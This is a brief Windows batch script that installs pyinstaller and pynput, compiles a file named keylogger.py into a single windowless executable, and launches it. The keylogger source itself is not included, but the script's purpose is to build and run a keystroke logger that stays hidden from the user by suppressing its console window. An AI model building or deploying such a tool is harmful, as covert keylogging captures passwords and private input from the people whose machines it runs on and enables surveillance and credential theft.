@echo off
pip install pyinstaller
pip install pynput
pyinstaller.exe --noconsole --onefile keylogger.py
.\dist\keylogger.exe